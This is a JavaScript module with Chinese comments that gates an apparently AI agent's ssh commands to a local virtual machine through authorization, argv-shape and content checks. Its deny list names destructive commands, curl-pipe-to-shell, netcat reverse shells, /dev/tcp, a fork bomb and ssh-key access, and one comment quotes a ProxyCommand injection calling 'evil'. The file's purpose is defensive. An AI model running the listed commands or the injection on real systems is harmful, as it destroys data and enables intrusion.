/**
 * vm.mjs —— 虚拟机（远端 Linux）的唯一放行口
 *
 * 和 exec-guard.mjs 的分工：
 *   - exec-guard 管**本机进程**：只接受「可执行文件 + 参数数组」，没有 shell 参与，
 *     所以 `;` `&&` `|` `$()` 在结构上就无效。
 *   - vm.mjs 管**另一台机器**：sshd 那一端一定会起 shell，命令本质就是一段文本，
 *     没法用参数数组消除拼接。所以改成三道闸。
 *
 * ⚠️ 关于「内容闸」的定性（别指望它当边界）：
 *   `dangerReason()` 是**尽力而为的黑名单**，不是安全边界。它挡得住明显的破坏性写法，
 *   但挡不住 `python3 -c '...'`、`perl -e '...'` 这类图灵完备的间接表达——那本质上
 *   不可能穷举。**真正的边界是「主人有没有打开 grants.vm 这一项」**：没授权时连
 *   TCP 探活都不会发。黑名单只是给「已经授权之后」多加一层保险，减少她手滑把机器
 *   弄坏的概率，不是用来防蓄意攻击的。
 *
 * 三道闸：
 *   1. 授权闸（在 index.mjs 的 act() 里）：没 grants.vm 就当作没有这个动作。
 *   2. 形状闸（checkVmExec）：送进 ssh 的 argv 必须是我们拼的那一种形态。
 *   3. 内容闸（dangerReason / looksBroken）：命中即拒 / 退回重写。
 */
import fs from 'node:fs';
import net from 'node:net';
import os from 'node:os';
import path from 'node:path';

/** 虚拟机默认怎么连（VirtualBox NAT 转发：宿主 127.0.0.1:2222 → 客户机 22） */
export const VM_DEFAULT = { host: '127.0.0.1', port: 2222, user: 'aurelia' };

/** 命令最大长度：base64 之后还要留余量，argv 太长会被系统和 sshd 拒 */
export const VM_MAX_CMD = 4000;

/** 单步超时、多步之间停顿 */
const STEP_TIMEOUT_MS = 120_000;
const STEP_GAP_MS = 1500;

/**
 * 危险命令：命中即拒。
 *
 * 这是**尽力而为**，不是完备防线（见文件头）。加规则的原则：
 *   - 只加「明确没有正当用途」的写法，宁可漏也不要大面积误杀她正常干活；
 *   - 一旦发现新的绕过手法，补一条 + 补一条测试钉住。
 */
const DANGEROUS = [
  // ── 破坏性删除 ──
  // 短选项组合（-rf / -fr / -Rf）和长选项（--recursive --force）都要挡
  { re: /\brm\s+(-[a-zA-Z]*[rf][a-zA-Z]*\s+)+/, why: '递归或强制删除' },
  { re: /\brm\s+[^|;&]*(?:--recursive|--force|--no-preserve-root)/, why: '递归或强制删除（长选项）' },
  { re: /\b(rm|rmdir)\s+(?:-[a-zA-Z]+\s+)*\/(?:\s|$)/, why: '删根目录' },
  { re: /\bfind\b[^|;&]*-delete\b/, why: 'find -delete 批量删除' },
  { re: /\bfind\b[^|;&]*-exec\s+(?:rm|shred|unlink)\b/, why: 'find -exec 删除' },
  // ── 格式化 / 写裸设备 / 擦除 ──
  { re: /\bmkfs(\.\w+)?\b/, why: '格式化文件系统' },
  { re: /\bdd\b[^|;]*\bof=\/dev\//, why: '写裸设备' },
  { re: /\b(shred|wipefs)\b/, why: '擦除数据' },
  { re: />\s*\/dev\/(sd|nvme|hd|vd)/, why: '重定向到磁盘设备' },
  // ── 关机 / 重启 / 杀关键进程 ──
  { re: /\b(shutdown|reboot|halt|poweroff)\b/, why: '关机或重启' },
  { re: /\binit\s+[06]\b/, why: '切换运行级别' },
  { re: /\bkill\s+(-9|-KILL|-s\s*(9|KILL))\s+1\b/, why: '杀 init 进程' },
  { re: /\bkill\s+-9\s+-1\b|\bkillall5\b/, why: '杀全部进程' },
  // ── 权限 / 属主 ──
  { re: /\bchmod\s+(-[a-zA-Z]+\s+)*777\s+\//, why: '把根目录改成 777' },
  { re: /\bchmod\s+(-[a-zA-Z]+\s+)*[ugoa]*\+s\b/, why: '设置 setuid/setgid' },
  { re: /\bchmod\s+(-R\s+|--recursive\s+)?0{3,}\b/, why: '把权限改成 000（自己都进不去）' },
  { re: /\bchown\s+(-[a-zA-Z]+\s+)*[^ ]+\s+\/\s*$/, why: '改根目录属主' },
  // ── 提权 / 改账户 ──
  { re: /\b(sudo|su|doas)\s/, why: '提权' },
  { re: /\b(useradd|userdel|usermod|groupadd|groupdel|passwd)\b/, why: '改账户' },
  // ── 下载即执行 / 落盘脚本再跑 / 管道进 shell ──
  { re: /\b(curl|wget|fetch)\b[^|;]*\|\s*(ba|z|d|k)?sh\b/, why: '下载后直接执行' },
  { re: /\|\s*(ba|z|d|k)?sh\s*($|;)/, why: '管道进 shell' },
  { re: />\s*[^\s|;&]+\.(sh|bash)\b/, why: '把内容写成脚本文件再执行' },
  { re: /\b(ba|z|d)?sh\s+(?!-)[^\s|;&]+\.(sh|bash)\b/, why: '执行落盘的脚本文件' },
  { re: /\beval\s+/, why: 'eval 动态执行' },
  // ── 用解释器绕（图灵完备，挡不全，但明显的删/执行要拦）──
  { re: /\bpython[0-9.]*\s+-c\b[^\n]*(rmtree|shutil\.|os\.(remove|unlink|rmdir)|subprocess|os\.system|os\.popen)/, why: '解释器里删文件/起进程' },
  { re: /\b(perl|ruby|node)\s+-e\b[^\n]*(unlink|FileUtils|rmSync|unlinkSync|child_process)/, why: '解释器里删文件/起进程' },
  // ── 碰 ssh 私钥 / 授权文件 ──
  { re: /\.ssh\/(id_|authorized_keys)/, why: '碰 ssh 私钥或授权文件' },
  { re: /\b(ssh-keygen|ssh-add|ssh-copy-id)\b/, why: '改 ssh 密钥/代理' },
  // ── 反弹 shell / 裸网络 ──
  { re: /:\(\)\s*\{.*\}\s*;?\s*:/, why: 'fork 炸弹' },
  { re: /\b(nc|ncat|netcat|socat)\b/, why: '裸网络连接（可做反弹 shell）' },
  { re: /\bnc\b[^|;]*\s-e\s/, why: '反弹 shell' },
  { re: /\/dev\/(tcp|udp)\//, why: 'bash 直接开网络连接' },
  // ── 防火墙 / 内核 / 计划任务 ──
  { re: /\b(iptables|nft|ufw|firewall-cmd)\b/, why: '改防火墙' },
  { re: /\b(sysctl|insmod|rmmod|modprobe)\b/, why: '改内核参数或模块' },
  { re: /\bcrontab\s+-r\b/, why: '清空计划任务' },
  // ── 拿它当跳板 ──
  { re: /\b(ssh|scp|sftp|rsync)\b[^|;]*@/, why: '从虚拟机再连别的主机（当跳板）' },
];

/** 命中危险命令就返回原因，否则空串 */
export function dangerReason(cmd) {
  const s = String(cmd || '');
  for (const d of DANGEROUS) {
    if (d.re.test(s)) return d.why;
  }
  return '';
}

/**
 * 命令看起来没写完：引号不配对、结尾停在 | && || \ 、heredoc 没闭合、
 * 或者压根不是命令（只有中文描述）、或者她自己多套了一层 base64。
 * 这类「半截命令」交给 bash 只会变成乱七八糟的报错，不如直接退回让她重写。
 */
export function looksBroken(cmd) {
  const s = String(cmd || '').trim();
  if (!s) return '空命令';
  const sq = (s.match(/'/g) || []).length;
  const dq = (s.match(/"/g) || []).length;
  if (sq % 2 === 1) return '单引号没闭合（命令写到一半断了）';
  if (dq % 2 === 1) return '双引号没闭合（命令写到一半断了）';
  if (/(\|\||&&|\||>|>>|=|\\)$/.test(s)) return '命令结尾停在 ' + s.slice(-2) + '（没写完）';
  const hd = s.match(/<<-?\s*['"]?([A-Za-z_][A-Za-z0-9_]*)['"]?/);
  if (hd) {
    const tag = hd[1];
    const lines = s.split('\n').map((x) => x.trim());
    if (!lines.includes(tag)) return `heredoc ${tag} 没有闭合`;
  }
  if (/[\u4e00-\u9fa5]/.test(s) && !/[;&|><=$`]/.test(s)) {
    return '这写的是一句描述，不是能执行的命令';
  }
  return '';
}

/** 把一段（可能多行的）命令编成一行远端可执行的 shell 片段 */
export function wrapRemote(cmd) {
  const b64 = Buffer.from(String(cmd), 'utf8').toString('base64');
  return `printf %s ${b64} | base64 -d | bash`;
}

/**
 * 校验连接目标。
 *
 * 为什么必须做：`buildSshArgs` 会把 `user@host` 作为**一个 argv 元素**拼进去，
 * 但如果 user 以 `-` 开头（比如 `-oProxyCommand=curl evil|sh`），ssh 会把它当成
 * 自己的选项——设置一旦被污染就是本机命令执行。所以这里只允许最朴素的
 * 用户名字符集，主机只允许 IPv4 / 域名 / localhost。
 */
export function validateTarget(cfg) {
  const host = String((cfg && cfg.host) || VM_DEFAULT.host).trim();
  const user = String((cfg && cfg.user) || VM_DEFAULT.user).trim();
  // 注意别用 `||`：port=0 是 falsy，会被静默替换成默认 2222 从而绕过下面的校验
  const rawPort = cfg && cfg.port;
  const port = rawPort === undefined || rawPort === null || rawPort === '' ? VM_DEFAULT.port : Number(rawPort);

  if (!/^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/.test(user)) {
    throw new Error('虚拟机用户名不合法（只允许字母数字点下划线短横线，且不能以 - 开头）');
  }
  if (!/^[A-Za-z0-9][A-Za-z0-9.-]{0,252}$/.test(host)) {
    throw new Error('虚拟机地址不合法（只允许字母数字点短横线，且不能以 - 开头）');
  }
  if (!Number.isInteger(port) || port < 1 || port > 65535) {
    throw new Error('虚拟机端口不合法（1-65535 的整数）');
  }
  return { host, user, port };
}

/**
 * 拼 ssh 的 argv。
 *
 * BatchMode=yes + NumberOfPasswordPrompts=0 是硬要求：不然公钥一不对，ssh 会退到
 * 「请输入密码」，而调用方的 stdin 是个永远不关的管道 → 进程挂到超时被杀 →
 * 拿到的错误只剩一句 Command failed，真正的 Permission denied 被吞掉。
 */
export function buildSshArgs(cfg, remote) {
  const { host, user, port } = validateTarget(cfg);
  const args = [
    '-p', String(port),
    '-o', 'StrictHostKeyChecking=accept-new',
    '-o', 'BatchMode=yes',
    '-o', 'NumberOfPasswordPrompts=0',
    '-o', 'PreferredAuthentications=publickey',
    '-o', 'ConnectTimeout=8',
  ];
  const keyFile = String((cfg && cfg.keyFile) || '').trim();
  if (keyFile) args.push('-i', keyFile);
  args.push(`${user}@${host}`);
  // 远端命令作为最后一个参数：base64 之后只含 A-Z a-z 0-9 + / = 和空格，不会被本地拆
  args.push(String(remote || 'true'));
  return args;
}

/**
 * 送进 ssh 之前的最后一道：形状校验。
 * 远端那一端一定会起 shell，所以这里不假装能「结构上消除拼接」，
 * 而是确认 argv 就是我们要的那几条开关 + 一个 base64 包装过的命令。
 */
export function checkVmExec(argv) {
  if (!Array.isArray(argv) || !argv.length) throw new Error('vm: argv 为空');
  const remote = String(argv[argv.length - 1] || '');
  if (!/^printf %s [A-Za-z0-9+/=]+ \| base64 -d \| bash$/.test(remote)) {
    throw new Error('vm: 远端命令必须是 base64 包装后的形态');
  }
  if (!argv.includes('BatchMode=yes')) throw new Error('vm: 必须带 BatchMode=yes');
  if (argv.includes('PasswordAuthentication=yes')) {
    throw new Error('vm: 不允许退回密码认证');
  }
  // 选项必须都在 user@host 之前，且 user@host 只有一个
  const hostArg = argv.findIndex((a) => /^[A-Za-z0-9][A-Za-z0-9._-]*@[A-Za-z0-9][A-Za-z0-9.-]*$/.test(String(a)));
  if (hostArg < 0) throw new Error('vm: argv 里找不到 user@host');
  if (argv.slice(hostArg + 1).length !== 1) throw new Error('vm: user@host 之后只允许一条远端命令');
  return true;
}

/** 只测 TCP 通不通，不登入、不握手 */
export function tcpProbe(host, port, timeoutMs = 2500) {
  return new Promise((resolve) => {
    let done = false;
    let sock = null;
    const finish = (ok) => {
      if (done) return;
      done = true;
      try {
        if (sock) sock.destroy();
      } catch (error) {}
      resolve(ok);
    };
    try {
      sock = net.connect({ host, port: Number(port) });
    } catch (error) {
      return finish(false);
    }
    sock.setTimeout(timeoutMs);
    sock.once('connect', () => finish(true));
    sock.once('timeout', () => finish(false));
    sock.once('error', () => finish(false));
  });
}

/**
 * 私钥在哪：设置里给的最优先，其次按常见位置找。
 * DSH 换安装位置后 home 会变，写死一条路径就会全线连不上。
 */
export function resolveKeyFile(settings, homeDir) {
  const home = homeDir || os.homedir();
  const cands = [
    String((settings && settings.vmSshKey) || '').trim(),
    path.join(home, '.ssh', 'id_ed25519'),
    path.join(home, '.ssh', 'id_rsa'),
  ].filter(Boolean);
  for (const c of cands) {
    try {
      if (fs.existsSync(c)) return c;
    } catch (error) {}
  }
  return cands[0] || '';
}

/** 判断失败原因值不值得重试（sshd 偶尔重置连接，不是命令写错了） */
const RETRYABLE = /kex_exchange|Connection reset|Connection refused|Broken pipe|Connection closed|timed out/i;

/**
 * 跑一条命令。`exec` 可注入（默认 execFile），这样行为测试不需要真的开 ssh。
 *
 * 顺序很重要，测试逐条钉住：空命令 → 超长 → 半截命令 → 危险命令 → 目标校验
 * → 形状校验 —— 任何一道没过，`exec` 一次都不会被调用。
 */
export async function runVmCommand({ cmd, cfg, settings, exec, log, silent = false } = {}) {
  const command = String(cmd || '').trim();
  if (!command) return { ok: false, message: '没想好要跑什么' };
  if (command.length > VM_MAX_CMD) return { ok: false, message: `太长了，控制在 ${VM_MAX_CMD} 字符内` };

  const broken = looksBroken(command);
  if (broken) return { ok: false, message: `${broken}——重写一条能直接跑的完整命令` };
  const danger = dangerReason(command);
  if (danger) return { ok: false, message: `这条太危险（${danger}），不跑` };

  let argv;
  try {
    argv = buildSshArgs(
      {
        host: cfg && cfg.host,
        port: cfg && cfg.port,
        user: cfg && cfg.user,
        keyFile: resolveKeyFile(settings),
      },
      wrapRemote(command),
    );
    checkVmExec(argv);
  } catch (error) {
    return { ok: false, message: error.message };
  }

  const runner = typeof exec === 'function' ? exec : null;
  if (!runner) return { ok: false, message: 'vm: 没有可用的执行器' };
  const warn = (m) => {
    if (!silent && log && typeof log.warn === 'function') log.warn(m);
  };

  const once = () =>
    new Promise((resolve) => {
      runner(
        'ssh',
        argv,
        // stdin 设成 ignore：这台机器的 ssh.exe 在 stdin 是未关闭的管道时会一直等输入，
        // 以前就是这样把每一轮都拖到超时、还吞掉了真正的报错。
        { timeout: STEP_TIMEOUT_MS, windowsHide: true, maxBuffer: 4 * 1024 * 1024, stdio: ['ignore', 'pipe', 'pipe'] },
        (error, stdout, stderr) => {
          const out = String(stdout || '').trim();
          const err = String(stderr || '').trim();
          if (error) return resolve({ ok: false, message: (err || error.message).slice(0, 300) });
          resolve({ ok: true, out: out.slice(0, 1500) });
        },
      );
    });

  let r = await once();
  if (r.ok || !RETRYABLE.test(r.message)) {
    if (!r.ok) warn(`虚拟机命令失败（${command.replace(/\s+/g, ' ').slice(0, 60)}）：${r.message.slice(0, 200)}`);
    return r;
  }
  warn('虚拟机 SSH 掉了一下，2.5 秒后重试：' + r.message.slice(0, 160));
  await new Promise((z) => setTimeout(z, 2500));
  const r2 = await once();
  if (!r2.ok) warn(`虚拟机命令重试后仍失败（${command.replace(/\s+/g, ' ').slice(0, 60)}）：${r2.message.slice(0, 200)}`);
  return r2;
}

/**
 * 多步编排：一条一条跑，第一条失败就停，并记清是第几步断的。
 * `run` 可注入，所以「第一步被拒就停」「failAt 是第几步」这类行为能被直接测到。
 */
export async function execSteps({ cmds, run, sleep } = {}) {
  const list = Array.isArray(cmds) ? cmds.filter((c) => String(c || '').trim()) : [];
  if (!list.length) return { ok: false, failAt: 0, outs: [], note: '没想好要跑什么' };
  const wait = typeof sleep === 'function' ? sleep : (ms) => new Promise((z) => setTimeout(z, ms));
  const outs = [];
  let ok = true;
  let failAt = 0;
  for (let i = 0; i < list.length; i += 1) {
    const r = await run(list[i]);
    outs.push(r.ok ? r.out : '✗ ' + r.message);
    if (!r.ok) {
      ok = false;
      failAt = i + 1;
      break;
    }
    if (i < list.length - 1) await wait(STEP_GAP_MS);
  }
  const label = list.length > 1 ? `${list.length} 步` : String(list[0] || '').slice(0, 80);
  const failWhy = ok
    ? ''
    : `第 ${failAt}/${list.length} 步：${String(outs[outs.length - 1] || '').replace(/^✗\s*/, '').replace(/\s+/g, ' ').slice(0, 140)}`;
  return { ok, failAt, outs, label, failWhy };
}
